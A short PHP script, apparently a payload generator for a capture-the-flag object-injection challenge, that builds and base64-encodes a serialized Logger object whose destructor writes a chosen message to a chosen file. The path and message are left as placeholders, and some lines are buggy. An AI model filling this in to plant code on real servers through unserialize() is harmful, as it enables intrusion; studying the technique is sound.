<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="";
        $this->exitMsg="yyyyyyyyyyyyyyy";
        $this->logFile = "xxxxxxxxxx";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}

$s1 = serialize(new Logger(""));
echo $s1;
echo base64_encode($s1);
$d1 = unserialize($s1);
echo $d1;


?>
